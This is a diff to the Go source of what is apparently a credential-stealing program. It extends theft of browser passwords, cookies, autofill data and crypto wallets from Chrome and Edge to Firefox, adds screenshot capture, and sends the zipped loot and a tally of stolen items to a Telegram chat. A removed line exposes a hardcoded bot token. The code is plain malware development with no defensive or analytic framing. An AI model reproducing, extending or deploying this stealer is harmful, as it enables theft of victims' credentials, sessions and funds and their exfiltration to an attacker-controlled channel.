@@ -1,6 +1,7 @@
 package main
 
 import (
+	"fmt"
 	"os"
 	"path"
 	"sync"
@@ -24,16 +25,24 @@ func main() {
 	//Browser paths
 	edgePath := path.Join(os.Getenv("localappdata"), `Microsoft\Edge\User Data`)
 	chromePath := path.Join(os.Getenv("localappdata"), `Google\Chrome\User Data`)
+	firefoxPath := path.Join(os.Getenv("appdata"), `Mozilla\Firefox\Profiles`)
 
-	//Yoink browsers' passwords, cookies, wallets
-	wg.Add(1)
+	//Yoink
+	wg.Add(4)
 	go func() {
 		browsers.Chrome(chromePath, logFolderPath)
 		wg.Done()
 	}()
-	wg.Add(1)
 	go func() {
 		browsers.Edge(edgePath, logFolderPath)
+		wg.Done()
+	}()
+	go func() {
+		browsers.Firefox(firefoxPath, logFolderPath)
+		wg.Done()
+	}()
+	go func() {
+		utils.GetScreenshot(logFolderPath)
 		wg.Done()
 	}()
 	wg.Wait()
@@ -64,7 +73,7 @@ func main() {
 		panic(err)
 	}
 
-	bot, err := tgbotapi.NewBotAPI("1664618644:AAE7TvjRGvUagMxkulUclo5AD3BwUMul-i4")
+	bot, err := tgbotapi.NewBotAPI(os.Getenv("BOT_TOKEN"))
 	if err != nil {
 		panic(err)
 	}
@@ -73,6 +82,9 @@ func main() {
 		Name:  "log.zip",
 		Bytes: file,
 	})
+
+	msg := tgbotapi.NewMessage(-1001563265930, fmt.Sprintf("\xF0\x9F\x94\x94 NEW LOG\n\xF0\x9F\x8D\xAA COOKIES: %d\n\xF0\x9F\x94\x92 PASSWORDS: %d\n\xF0\x9F\x94\x93 AUTOFILLS: %d\n\xF0\x9F\x92\xB3 WALLETS: %d%s", utils.CookieAmount, utils.PasswordAmount, utils.AutofillAmount, utils.WalletAmount, utils.InfoStr))
+	bot.Send(msg)
 
 	bot.Send(tgbotapi.MediaGroupConfig{
 		ChatID:          -1001563265930,
